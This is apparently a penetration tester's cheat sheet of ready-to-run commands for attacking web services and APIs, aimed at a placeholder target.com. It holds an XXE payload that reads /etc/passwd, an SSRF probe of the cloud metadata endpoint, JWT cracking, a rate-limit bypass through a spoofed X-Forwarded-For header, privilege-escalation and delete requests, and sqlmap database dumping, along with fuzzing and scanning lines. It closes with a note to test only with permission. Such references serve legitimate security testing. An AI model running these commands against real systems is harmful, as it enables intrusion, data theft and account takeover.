
## XML-RPC Attacks

### Manual Request Crafting (curl)

```bash
curl -X POST -H "Content-Type: text/xml" -d '<?xml version="1.0"?><methodCall><methodName>examples.getStateName</methodName><params><param><value><i4>41</i4></value></param></params></methodCall>' http://target.com/RPC2
```

### Fuzzing with wfuzz

```bash
wfuzz -z file,xmlrpc_methods.txt -d '<?xml version="1.0"?><methodCall><methodName>FUZZ</methodName><params><param><value><i4>1</i4></value></param></params></methodCall>' http://target.com/RPC2
```

## JSON-RPC Attacks

### Manual Request Crafting (curl)

```bash
curl -X POST -H "Content-Type: application/json-rpc" -d '{"method": "sum", "params": {"a": 3, "b": 4}, "id": 0}' http://target.com/ENDPOINT
```

### Fuzzing with wfuzz

```bash
wfuzz -z file,jsonrpc_methods.txt -d '{"method": "FUZZ", "params": {}, "id": 0}' http://target.com/ENDPOINT
```

## SOAP Attacks

### Manual Request Crafting (curl)

```bash
curl -X POST -H "Content-Type: text/xml;charset=UTF-8" -d '<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"><SOAP-ENV:Body><m:GetQuotation xmlns:m="http://www.xyz.org/quotations"><m:QuotationsName>Microsoft</m:QuotationsName></m:GetQuotation></SOAP-ENV:Body></SOAP-ENV:Envelope>' http://target.com/Quotation
```

## RESTful API Attacks

### Basic HTTP Requests (curl)

```bash
curl -X GET http://target.com/api/users
curl -X POST -H "Content-Type: application/json" -d '{"username": "test", "password": "password"}' http://target.com/api/login
curl -X PUT -H "Content-Type: application/json" -d '{"admin": true}' http://target.com/api/users/1
curl -X DELETE http://target.com/api/users/1
```

### Fuzzing with wfuzz

```bash
wfuzz -z file,api_endpoints.txt http://target.com/api/FUZZ
```

### SSRF Tests (curl)

```bash
curl "http://target.com/api/proxy?url=http://169.254.169.254/"
```

### XXE Tests (curl)

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>' http://target.com/api/xml
```

### JWT Attacks (using jwt_tool)

```bash
jwt_tool <JWT> -C
```

### API Rate Limiting Bypass (using ffuf)

```bash
ffuf -u http://target.com/api/login -X POST -d '{"username": "test", "password": "password"}' -H "Content-Type: application/json" -H "X-Forwarded-For: FUZZ" -w wordlists/ip_list.txt
```

## General Web Service/API Tools

### Nmap (Network Scanning)

```bash
nmap -sV -sC target.com
nmap -p 80,443,8080 target.com
```

### Nikto (Web Server Scanning)

```bash
nikto -h target.com
nikto -h target.com -p 8080
```

### Gobuster (Directory Brute-forcing)

```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -k
```

### SQLmap (SQL Injection)

```bash
sqlmap -u "http://target.com/api/endpoint?id=1" --dbs
sqlmap -u "http://target.com/api/endpoint?id=1" --dump
```

### Burp Suite (GUI & Automation via Burp APIs)

### Postman (API Testing & Automation via Newman)

```bash
newman run collection.json
```

### OWASP ZAP (Automated Security Testing)

```bash
zap-cli active-scan -t target.com
```

### Wsdump.pl (WSDL analysis, part of OWASP WSFuzzer)

```bash
wsdump.pl -o output.txt http://target.com/service?wsdl
```

## Key Things to Remember

- **Placeholders**: Replace `target.com`, `http://target.com/api/endpoint`, etc., with actual targets.
    
- **Wordlists**: Ensure `xmlrpc_methods.txt`, `jsonrpc_methods.txt`, `api_endpoints.txt` exist.
    
- **Dependencies**: Install tools (`curl`, `wfuzz`, `nmap`, etc.) before testing.
    
- **Ethical Use**: Only test on systems you have explicit permission for.
    
- **Burp Suite/Postman**: Primarily GUI tools but support CLI automation.
    
- **OWASP ZAP**: Requires CLI tools installed for automation.